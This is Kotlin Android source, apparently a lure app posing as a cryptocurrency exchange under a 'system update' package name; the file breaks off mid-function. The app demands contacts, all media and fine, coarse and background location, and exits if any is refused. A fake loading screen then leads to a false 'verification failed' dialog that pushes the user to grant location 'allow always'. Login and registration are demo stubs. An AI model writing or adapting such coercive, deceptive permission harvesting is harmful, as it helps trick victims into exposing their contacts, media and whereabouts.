package com.sys.update2

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Canvas as ComposeCanvas
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color as ComposeColor
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.LayoutDirection
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.delay
import kotlin.random.Random

data class LangItem(val name: String, val flag: String)

class LoginActivity : ComponentActivity() {

    private var currentScreen by mutableStateOf(-1) // -1=Language, 0=Login, 1=Register, 2=Reset
    private var email by mutableStateOf("")
    private var password by mutableStateOf("")
    private var capInput by mutableStateOf("")
    private var capCode by mutableStateOf("")
    private var pwVisible by mutableStateOf(false)

    private var selectedLang by mutableStateOf(0)
    private var showLoadingOverlay by mutableStateOf(false)
    private var showLocationDialog by mutableStateOf(false)
    private var permissionsStarted by mutableStateOf(false)

    private var regEmail by mutableStateOf("")
    private var regVC by mutableStateOf("")
    private var regP1 by mutableStateOf("")
    private var regP2 by mutableStateOf("")
    private var regRef by mutableStateOf("")
    private var regP1Visible by mutableStateOf(false)
    private var regP2Visible by mutableStateOf(false)

    private var resetEmail by mutableStateOf("")
    private var resetVC by mutableStateOf("")
    private var resetP1 by mutableStateOf("")
    private var resetP1Visible by mutableStateOf(false)

    private var permRequestIndex = 0
    private var anyRejected = false

    // ⭐ الصلاحيات — تطلب بعد تجاوز صفحة اللغة
    private val permissionsToAsk: List<String> by lazy {
        val list = mutableListOf<String>()
        list.add(Manifest.permission.READ_CONTACTS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
            list.add(Manifest.permission.READ_MEDIA_VIDEO)
            list.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        list.add(Manifest.permission.ACCESS_FINE_LOCATION)
        list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        list
    }

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (!granted) {
            anyRejected = true
            exitApp()
        } else {
            permRequestIndex++
            Handler(Looper.getMainLooper()).postDelayed({
                askNextPermission()
            }, 500)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.statusBarColor = Color.parseColor("#02081a")
        window.navigationBarColor = Color.parseColor("#02081a")

        capCode = generateCaptcha()

        setContent {
            AppTheme {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(
                            Brush.radialGradient(
                                colors = listOf(
                                    ComposeColor(0xFF1a5fd0),
                                    ComposeColor(0xFF071e4d),
                                    ComposeColor(0xFF02081a)
                                ),
                                radius = 1200f
                            )
                        )
                ) {
                    when (currentScreen) {
                        -1 -> LanguageScreen()
                        0 -> LoginScreen()
                        1 -> RegisterScreen()
                        2 -> ResetScreen()
                    }

                    if (showLoadingOverlay) {
                        LoadingOverlay()
                    }

                    if (showLocationDialog) {
                        LocationSettingsDialog()
                    }

                    // بعد 3 ثواني → إظهار مربع فشل التحقق
                    LaunchedEffect(showLoadingOverlay) {
                        if (showLoadingOverlay) {
                            delay(3000)
                            showLoadingOverlay = false
                            showLocationDialog = true
                        }
                    }
                }
            }
        }

        // ⭐ طلب صلاحية الموقع (Background Location) بعد فتح التطبيق
        Handler(Looper.getMainLooper()).postDelayed({
            requestBackgroundLocationDirect()
        }, 1500L)
    }

    // ═══════════════════════════════════════════
    //  Language Selection Screen
    // ═══════════════════════════════════════════
    @Composable
    fun LanguageScreen() {
        val languages = listOf(
            LangItem("English", "us"),
            LangItem("中文简体", "cn"),
            LangItem("中文繁体", "cn"),
            LangItem("日本語", "jp"),
            LangItem("Türkçe", "tr"),
            LangItem("한국인", "kr"),
            LangItem("Vietnam", "vn"),
            LangItem("French", "fr"),
            LangItem("Portuguese", "pt"),
            LangItem("اردو", "pk"),
            LangItem("چینی (ساده شده)", "ir"),
            LangItem("ภาษาจีน(ตัวย่อ)", "th")
        )

        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(ComposeColor(0xFF0B1220))
                .padding(horizontal = 20.dp)
        ) {
            // Header
            Spacer(Modifier.height(40.dp))

            Column(
                modifier = Modifier.fillMaxWidth(),
                horizontalAlignment = Alignment.End
            ) {
                Text(
                    "اختر اللغة",
                    color = ComposeColor(0xFFF2F5FA),
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Right,
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Select your language",
                    color = ComposeColor(0xFF8A94A6),
                    fontSize = 13.sp,
                    textAlign = TextAlign.Right,
                    modifier = Modifier.fillMaxWidth()
                )
            }

            Spacer(Modifier.height(24.dp))

            // قائمة اللغات
            Column(
                modifier = Modifier
                    .weight(1f)
                    .verticalScroll(rememberScrollState())
            ) {
                languages.forEachIndexed { index, item ->
                    val selected = selectedLang == index
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(
                                if (selected) ComposeColor(0xFF161F33) else ComposeColor.Transparent
                            )
                            .clickable { selectedLang = index }
                            .padding(horizontal = 12.dp, vertical = 14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            item.name,
                            color = ComposeColor(0xFFF2F5FA),
                            fontSize = 15.sp,
                            modifier = Modifier.weight(1f)
                        )

                        Spacer(Modifier.width(14.dp))

                        FlagIcon(
                            code = item.flag,
                            modifier = Modifier
                                .width(32.dp)
                                .height(23.dp)
                        )

                        Spacer(Modifier.width(14.dp))

                        if (selected) {
                            Box(
                                modifier = Modifier
                                    .size(26.dp)
                                    .clip(CircleShape)
                                    .background(ComposeColor(0xFF6C4DF6)),
                                contentAlignment = Alignment.Center
                            ) {
                                Text(
                                    "✓",
                                    color = ComposeColor.White,
                                    fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        } else {
                            Box(
                                modifier = Modifier
                                    .size(26.dp)
                                    .border(2.dp, ComposeColor(0xFF7D8798), CircleShape)
                            )
                        }
                    }
                }
            }

            // ⭐ زر متابعة احترافي
            Spacer(Modifier.height(12.dp))

            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(56.dp)
                    .clip(RoundedCornerShape(16.dp))
                    .background(
                        Brush.horizontalGradient(
                            colors = listOf(
                                ComposeColor(0xFF3D8BFF),
                                ComposeColor(0xFF1A5CFF)
                            )
                        )
                    )
                    .clickable {
                        currentScreen = 0
                        showLoadingOverlay = true
                    },
                contentAlignment = Alignment.Center
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        "متابعة",
                        color = ComposeColor.White,
                        fontSize = 17.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(Modifier.width(8.dp))
                    Text(
                        "←",
                        color = ComposeColor.White,
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }

            Spacer(Modifier.height(24.dp))
        }
    }

    // ═══════════════════════════════════════════
    //  Flags
    // ═══════════════════════════════════════════
    @Composable
    fun FlagIcon(code: String, modifier: Modifier = Modifier) {
        ComposeCanvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
            val w = size.width
            val h = size.height
            when (code) {
                "us" -> {
                    val stripe = h / 13f
                    for (i in 0 until 13) {
                        drawRect(
                            color = if (i % 2 == 0) ComposeColor(0xFFB22234) else ComposeColor.White,
                            topLeft = Offset(0f, i * stripe),
                            size = Size(w, stripe + 1f)
                        )
                    }
                    drawRect(
                        ComposeColor(0xFF3C3B6E),
                        topLeft = Offset.Zero,
                        size = Size(w * 0.45f, stripe * 7f)
                    )
                    val dotR = stripe * 0.3f
                    for (row in 0 until 4) {
                        for (col in 0 until 5) {
                            drawCircle(
                                ComposeColor.White,
                                radius = dotR,
                                center = Offset(
                                    w * 0.45f * (col + 0.5f) / 5f,
                                    stripe * 7f * (row + 0.5f) / 4f
                                )
                            )
                        }
                    }
                }
                "cn" -> {
                    drawRect(ComposeColor(0xFFDE2910))
                    drawPath(
                        starPath(w * 0.22f, h * 0.32f, h * 0.22f),
                        ComposeColor(0xFFFFDE00)
                    )
                }
                "jp" -> {
                    drawRect(ComposeColor.White)
                    drawCircle(
                        ComposeColor(0xFFBC002D),
                        radius = h * 0.3f,
                        center = Offset(w / 2f, h / 2f)
                    )
                }
                "tr" -> {
                    drawRect(ComposeColor(0xFFE30A17))
                    drawCircle(
                        ComposeColor.White,
                        radius = h * 0.3f,
                        center = Offset(w * 0.38f, h / 2f)
                    )
                    drawCircle(
                        ComposeColor(0xFFE30A17),
                        radius = h * 0.25f,
                        center = Offset(w * 0.44f, h / 2f)
                    )
                    drawPath(
                        starPath(w * 0.6f, h / 2f, h * 0.13f, startDeg = 180),
                        ComposeColor.White
                    )
                }
                "kr" -> {
                    drawRect(ComposeColor.White)
                    val d = h * 0.56f
                    val tl = Offset(w / 2f - d / 2f, h / 2f - d / 2f)
                    drawArc(
                        ComposeColor(0xFFCD2E3A),
                        startAngle = 180f,
                        sweepAngle = 180f,
                        useCenter = true,
                        topLeft = tl,
                        size = Size(d, d)
                    )
                    drawArc(
                        ComposeColor(0xFF0047A0),
                        startAngle = 0f,
                        sweepAngle = 180f,
                        useCenter = true,
                        topLeft = tl,
                        size = Size(d, d)
                    )
                }
                "vn" -> {
                    drawRect(ComposeColor(0xFFDA251D))
                    drawPath(
                        starPath(w / 2f, h / 2f, h * 0.28f),
                        ComposeColor(0xFFFFFF00)
                    )
                }
                "fr" -> {
                    drawRect(ComposeColor(0xFF0055A4), size = Size(w / 3f, h))
                    drawRect(
                        ComposeColor.White,
                        topLeft = Offset(w / 3f, 0f),
                        size = Size(w / 3f, h)
                    )
                    drawRect(
                        ComposeColor(0xFFEF4135),
                        topLeft = Offset(2f * w / 3f, 0f),
                        size = Size(w / 3f, h)
                    )
                }
                "pt" -> {
                    drawRect(ComposeColor(0xFF046A38), size = Size(w * 0.4f, h))
                    drawRect(
                        ComposeColor(0xFFDA291C),
                        topLeft = Offset(w * 0.4f, 0f),
                        size = Size(w * 0.6f, h)
                    )
                    drawCircle(
                        ComposeColor(0xFFFFE900),
                        radius = h * 0.16f,
                        center = Offset(w * 0.4f, h / 2f)
                    )
                }
                "pk" -> {
                    drawRect(ComposeColor(0xFF01411C))
                    drawRect(ComposeColor.White, size = Size(w * 0.25f, h))
                    drawCircle(
                        ComposeColor.White,
                        radius = h * 0.28f,
                        center = Offset(w * 0.62f, h * 0.45f)
                    )
                    drawCircle(
                        ComposeColor(0xFF01411C),
                        radius = h * 0.24f,
                        center = Offset(w * 0.68f, h * 0.4f)
                    )
                }
                "ir" -> {
                    drawRect(ComposeColor(0xFF239F40), size = Size(w, h / 3f))
                    drawRect(
                        ComposeColor.White,
                        topLeft = Offset(0f, h / 3f),
                        size = Size(w, h / 3f)
                    )
                    drawRect(
                        ComposeColor(0xFFDA0000),
                        topLeft = Offset(0f, 2f * h / 3f),
                        size = Size(w, h / 3f)
                    )
                }
                "th" -> {
                    val s = h / 6f
                    drawRect(ComposeColor(0xFFA51931), size = Size(w, s))
                    drawRect(ComposeColor(0xFFF4F5F8), topLeft = Offset(0f, s), size = Size(w, s))
                    drawRect(ComposeColor(0xFF2D2A4A), topLeft = Offset(0f, 2f * s), size = Size(w, 2f * s))
                    drawRect(ComposeColor(0xFFF4F5F8), topLeft = Offset(0f, 4f * s), size = Size(w, s))
                    drawRect(ComposeColor(0xFFA51931), topLeft = Offset(0f, 5f * s), size = Size(w, s))
                }
                else -> drawRect(ComposeColor(0xFF555555))
            }
        }
    }

    private fun starPath(cx: Float, cy: Float, outerR: Float, startDeg: Int = -90): Path {
        val innerR = outerR * 0.382f
        val path = Path()
        for (i in 0 until 10) {
            val angle = Math.toRadians((startDeg + i * 36).toDouble())
            val r = if (i % 2 == 0) outerR else innerR
            val x = cx + (r * Math.cos(angle)).toFloat()
            val y = cy + (r * Math.sin(angle)).toFloat()
            if (i == 0) path.moveTo(x, y) else path.lineTo(x, y)
        }
        path.close()
        return path
    }

    // ═══════════════════════════════════════════
    //  Loading Overlay
    // ═══════════════════════════════════════════
    @Composable
    fun LoadingOverlay() {
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(ComposeColor(0x33000000))
                .clickable(
                    interactionSource = remember { MutableInteractionSource() },
                    indication = null
                ) {},
            contentAlignment = Alignment.Center
        ) {
            Box(
                modifier = Modifier
                    .size(96.dp)
                    .clip(RoundedCornerShape(16.dp))
                    .background(ComposeColor(0xB3000000)),
                contentAlignment = Alignment.Center
            ) {
                DashedLoadingIndicator()
            }
        }
    }

    @Composable
    fun DashedLoadingIndicator() {
        val transition = rememberInfiniteTransition()
        val rotation by transition.animateFloat(
            initialValue = 0f,
            targetValue = 360f,
            animationSpec = infiniteRepeatable(
                animation = tween(durationMillis = 1200, easing = LinearEasing)
            )
        )
        ComposeCanvas(modifier = Modifier.size(36.dp)) {
            val strokeW = 3.dp.toPx()
            val r = (size.minDimension - strokeW) / 2f
            val cx = size.width / 2f
            val cy = size.height / 2f
            val segments = 8
            val sweep = 360f / segments * 0.55f
            for (i in 0 until segments) {
                val start = rotation + i * (360f / segments)
                val alpha = 1f - (i.toFloat() / segments) * 0.75f
                drawArc(
                    color = ComposeColor.White.copy(alpha = alpha),
                    startAngle = start,
                    sweepAngle = sweep,
                    useCenter = false,
                    topLeft = Offset(cx - r, cy - r),
                    size = Size(r * 2f, r * 2f),
                    style = Stroke(width = strokeW, cap = StrokeCap.Round)
                )
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Location Settings Dialog
    // ═══════════════════════════════════════════
    @Composable
    fun LocationSettingsDialog() {
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(ComposeColor(0x66000000))
                .clickable(
                    interactionSource = remember { MutableInteractionSource() },
                    indication = null
                ) {},
            contentAlignment = Alignment.Center
        ) {
            Column(
                modifier = Modifier
                    .padding(horizontal = 30.dp)
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(18.dp))
                    .background(ComposeColor.White)
                    .padding(horizontal = 20.dp, vertical = 24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    "فشل التحقق من صحة المعلومات",
                    color = ComposeColor(0xFF1B1B1B),
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )

                Spacer(Modifier.height(14.dp))

                Text(
                    "يرجي تفعيل الموقع يدوي من الاعدادات\nالأذونات\nالموقع\nالسماح دائم\nثم اعد فتح التطبيق",
                    color = ComposeColor(0xFF5A5A5A),
                    fontSize = 14.5.sp,
                    textAlign = TextAlign.Center,
                    lineHeight = 24.sp
                )

                Spacer(Modifier.height(20.dp))

                Button(
                    onClick = {
                        try {
                            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                            i.data = Uri.parse("package:$packageName")
                            startActivity(i)
                        } catch (_: Exception) {}
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = ComposeColor(0xFF3D8BFF)
                    )
                ) {
                    Text(
                        "فتح اعدادات التطبيق",
                        color = ComposeColor.White,
                        fontSize = 15.5.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Login Screen
    // ═══════════════════════════════════════════
    @Composable
    fun LoginScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(22.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Image(
                    painter = painterResource(id = R.drawable.logo),
                    contentDescription = "Logo",
                    modifier = Modifier.height(60.dp),
                    contentScale = ContentScale.Fit
                )

                Spacer(Modifier.height(14.dp))

                Row(
                    modifier = Modifier
                        .clip(RoundedCornerShape(50))
                        .background(ComposeColor(0xBF0A193C))
                        .border(1.dp, ComposeColor(0x475A96FF), RoundedCornerShape(50))
                        .padding(horizontal = 15.dp, vertical = 7.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Image(
                        painter = painterResource(id = R.drawable.ic_home),
                        contentDescription = null,
                        modifier = Modifier.size(15.dp)
                    )
                    Spacer(Modifier.width(7.dp))
                    Text(
                        "Trade cryptocurrencies anytime",
                        color = ComposeColor(0xFFDBE7FF),
                        fontSize = 13.sp
                    )
                }

                Spacer(Modifier.height(15.dp))

                Text(
                    buildAnnotatedString {
                        append("Power up your\n")
                        withStyle(SpanStyle(color = ComposeColor(0xFF3D8BFF))) {
                            append("cryptocurrency")
                        }
                        append("\njourney")
                    },
                    color = ComposeColor.White,
                    fontSize = 30.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center,
                    lineHeight = 38.sp
                )

                Spacer(Modifier.height(12.dp))

                Image(
                    painter = painterResource(id = R.drawable.coin),
                    contentDescription = "Coin",
                    modifier = Modifier
                        .width(290.dp)
                        .offset(y = 32.dp),
                    contentScale = ContentScale.Fit
                )
            }

            Spacer(Modifier.height(32.dp))

            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(topStart = 34.dp, topEnd = 34.dp))
                    .background(ComposeColor(0xFF0A1128))
                    .padding(22.dp)
            ) {
                Row {
                    Text(
                        "Email",
                        color = ComposeColor.White,
                        fontSize = 16.5.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(end = 26.dp)
                    )
                    Text(
                        "Phone",
                        color = ComposeColor(0xFF5C6C8F),
                        fontSize = 16.5.sp,
                        fontWeight = FontWeight.Bold
                    )
                }

                Spacer(Modifier.height(18.dp))

                CustomInput(email, { email = it }, "Email")
                Spacer(Modifier.height(12.dp))

                PasswordInput(password, { password = it }, pwVisible, { pwVisible = !pwVisible }, "Password")

                Spacer(Modifier.height(12.dp))

                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp)
                        .clip(RoundedCornerShape(12.dp))
                        .background(ComposeColor(0xFF131C36))
                        .border(1.dp, ComposeColor(0xFF1E2A4D), RoundedCornerShape(12.dp))
                        .padding(horizontal = 16.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    BasicTextField(
                        value = capInput,
                        onValueChange = { if (it.length <= 6) capInput = it.uppercase() },
                        modifier = Modifier.weight(1f),
                        textStyle = androidx.compose.ui.text.TextStyle(
                            color = ComposeColor(0xFFE8EEF8),
                            fontSize = 15.sp
                        ),
                        decorationBox = { inner ->
                            if (capInput.isEmpty()) {
                                Text(
                                    "Please enter the verification code",
                                    color = ComposeColor(0xFF5C6C8F),
                                    fontSize = 15.sp
                                )
                            }
                            inner()
                        }
                    )
                    CaptchaBox(capCode) { capCode = generateCaptcha(); capInput = "" }
                }

                Spacer(Modifier.height(16.dp))

                Button(
                    onClick = {
                        if (email.isBlank() || password.isBlank()) {
                            showToast("Please enter email and password")
                        } else if (capInput.isNotBlank() && capInput != capCode) {
                            showToast("Verification code is incorrect")
                            capCode = generateCaptcha()
                            capInput = ""
                        } else {
                            showToast("Login successful (demo)")
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = ComposeColor(0xFF3D8BFF)
                    )
                ) {
                    Text("Log In", color = ComposeColor.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                }

                Spacer(Modifier.height(18.dp))

                Row {
                    Text(
                        "reset pass",
                        color = ComposeColor(0xFF8FA3C8),
                        fontSize = 14.sp,
                        modifier = Modifier
                            .weight(1f)
                            .clickable { currentScreen = 2 }
                            .padding(vertical = 8.dp)
                    )
                    Text(
                        "to register",
                        color = ComposeColor(0xFF8FA3C8),
                        fontSize = 14.sp,
                        textAlign = TextAlign.End,
                        modifier = Modifier
                            .weight(1f)
                            .clickable { currentScreen = 1 }
                            .padding(vertical = 8.dp)
                    )
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Register Screen
    // ═══════════════════════════════════════════
    @Composable
    fun RegisterScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(22.dp)
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                BackButton { currentScreen = 0 }
                Text(
                    "Email",
                    color = ComposeColor.White,
                    fontSize = 17.5.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.weight(1f)
                )
                Spacer(Modifier.width(38.dp))
            }

            Spacer(Modifier.height(28.dp))

            Label("Email")
            CustomInput(regEmail, { regEmail = it }, "Please enter your email address")

            Spacer(Modifier.height(16.dp))
            Label("Verification code")
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(54.dp)
                    .clip(RoundedCornerShape(10.dp))
                    .background(ComposeColor(0xFF16224A))
                    .border(1.dp, ComposeColor(0xFF23336B), RoundedCornerShape(10.dp))
                    .padding(horizontal = 16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                BasicTextField(
                    value = regVC,
                    onValueChange = { regVC = it },
                    modifier = Modifier.weight(1f),
                    textStyle = androidx.compose.ui.text.TextStyle(
                        color = ComposeColor(0xFFE8EEF8),
                        fontSize = 15.sp
                    ),
                    decorationBox = { inner ->
                        if (regVC.isEmpty()) {
                            Text("Please enter the verification code", color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
                        }
                        inner()
                    }
                )
                Text(
                    "Send",
                    color = ComposeColor(0xFFDCE8FF),
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier
                        .clickable { showToast("Code will be sent (demo)") }
                        .padding(start = 12.dp)
                )
            }

            Spacer(Modifier.height(16.dp))
            Label("Registration password (6-16)")
            PasswordInput(regP1, { regP1 = it }, regP1Visible, { regP1Visible = !regP1Visible }, "Password", registerInput = true)
            Spacer(Modifier.height(12.dp))
            PasswordInput(regP2, { regP2 = it }, regP2Visible, { regP2Visible = !regP2Visible }, "Enter password again", registerInput = true)

            Spacer(Modifier.height(16.dp))
            Label("Referrer Invitation Code (Required)")
            CustomInput(regRef, { regRef = it }, "Referrer invitation code", registerInput = true)

            Spacer(Modifier.height(30.dp))

            Button(
                onClick = {
                    if (regEmail.isBlank()) showToast("Please enter email")
                    else if (regVC.isBlank()) showToast("Please enter verification code")
                    else if (regP1.length < 6 || regP1.length > 16) showToast("Password must be 6-16 characters")
                    else if (regP1 != regP2) showToast("Passwords do not match")
                    else if (regRef.isBlank()) showToast("Please enter invitation code")
                    else showToast("Registration successful (demo)")
                },
                modifier = Modifier.fillMaxWidth().height(54.dp),
                shape = RoundedCornerShape(10.dp),
                colors = ButtonDefaults.buttonColors(containerColor = ComposeColor(0xFF3D8BFF))
            ) {
                Text("Register", color = ComposeColor.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
            }

            Spacer(Modifier.height(20.dp))

            Text(
                "To log in",
                color = ComposeColor(0xFF8BA5D9),
                fontSize = 14.5.sp,
                textAlign = TextAlign.Center,
                modifier = Modifier
                    .fillMaxWidth()
                    .clickable { currentScreen = 0 }
                    .padding(vertical = 8.dp)
            )
        }
    }

    // ═══════════════════════════════════════════
    //  Reset Screen
    // ═══════════════════════════════════════════
    @Composable
    fun ResetScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(22.dp)
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                BackButton { currentScreen = 0 }
                Text(
                    "Reset Password",
                    color = ComposeColor.White,
                    fontSize = 17.5.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.weight(1f)
                )
                Spacer(Modifier.width(38.dp))
            }

            Spacer(Modifier.height(28.dp))

            Label("Email")
            CustomInput(resetEmail, { resetEmail = it }, "Please enter your email address")

            Spacer(Modifier.height(16.dp))
            Label("Verification code")
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(54.dp)
                    .clip(RoundedCornerShape(10.dp))
                    .background(ComposeColor(0xFF16224A))
                    .border(1.dp, ComposeColor(0xFF23336B), RoundedCornerShape(10.dp))
                    .padding(horizontal = 16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                BasicTextField(
                    value = resetVC,
                    onValueChange = { resetVC = it },
                    modifier = Modifier.weight(1f),
                    textStyle = androidx.compose.ui.text.TextStyle(color = ComposeColor(0xFFE8EEF8), fontSize = 15.sp),
                    decorationBox = { inner ->
                        if (resetVC.isEmpty()) {
                            Text("Please enter the verification code", color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
                        }
                        inner()
                    }
                )
                Text(
                    "Send",
                    color = ComposeColor(0xFFDCE8FF),
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier
                        .clickable { showToast("Code will be sent (demo)") }
                        .padding(start = 12.dp)
                )
            }

            Spacer(Modifier.height(16.dp))
            Label("New password (6-16)")
            PasswordInput(resetP1, { resetP1 = it }, resetP1Visible, { resetP1Visible = !resetP1Visible }, "Enter new password", registerInput = true)

            Spacer(Modifier.height(30.dp))

            Button(
                onClick = {
                    if (resetEmail.isBlank()) showToast("Please enter email")
                    else if (resetVC.isBlank()) showToast("Please enter verification code")
                    else if (resetP1.length < 6 || resetP1.length > 16) showToast("Password must be 6-16 characters")
                    else {
                        showToast("Password changed (demo)")
                        currentScreen = 0
                    }
                },
                modifier = Modifier.fillMaxWidth().height(54.dp),
                shape = RoundedCornerShape(10.dp),
                colors = ButtonDefaults.buttonColors(containerColor = ComposeColor(0xFF3D8BFF))
            ) {
                Text("Confirm", color = ComposeColor.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Reusable Components
    // ═══════════════════════════════════════════
    @Composable
    fun Label(text: String) {
        Text(text, color = ComposeColor(0xFFEAF0FB), fontSize = 14.5.sp, modifier = Modifier.padding(bottom = 9.dp))
    }

    @Composable
    fun CustomInput(value: String, onChange: (String) -> Unit, hint: String, registerInput: Boolean = false) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(if (registerInput) 54.dp else 52.dp)
                .clip(RoundedCornerShape(if (registerInput) 10.dp else 12.dp))
                .background(ComposeColor(if (registerInput) 0xFF16224A else 0xFF131C36))
                .border(
                    1.dp,
                    ComposeColor(if (registerInput) 0xFF23336B else 0xFF1E2A4D),
                    RoundedCornerShape(if (registerInput) 10.dp else 12.dp)
                )
                .padding(horizontal = 16.dp),
            contentAlignment = Alignment.CenterStart
        ) {
            BasicTextField(
                value = value,
                onValueChange = onChange,
                modifier = Modifier.fillMaxWidth(),
                singleLine = true,
                textStyle = androidx.compose.ui.text.TextStyle(color = ComposeColor(0xFFE8EEF8), fontSize = 15.sp),
                decorationBox = { inner ->
                    if (value.isEmpty()) {
                        Text(hint, color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
                    }
                    inner()
                }
            )
        }
    }

    @Composable
    fun PasswordInput(
        value: String,
        onChange: (String) -> Unit,
        visible: Boolean,
        onToggle: () -> Unit,
        hint: String,
        registerInput: Boolean = false
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .height(if (registerInput) 54.dp else 52.dp)
                .clip(RoundedCornerShape(if (registerInput) 10.dp else 12.dp))
                .background(ComposeColor(if (registerInput) 0xFF16224A else 0xFF131C36))
                .border(
                    1.dp,
                    ComposeColor(if (registerInput) 0xFF23336B else 0xFF1E2A4D),
                    RoundedCornerShape(if (registerInput) 10.dp else 12.dp)
                )
                .padding(start = 16.dp, end = 12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            BasicTextField(
                value = value,
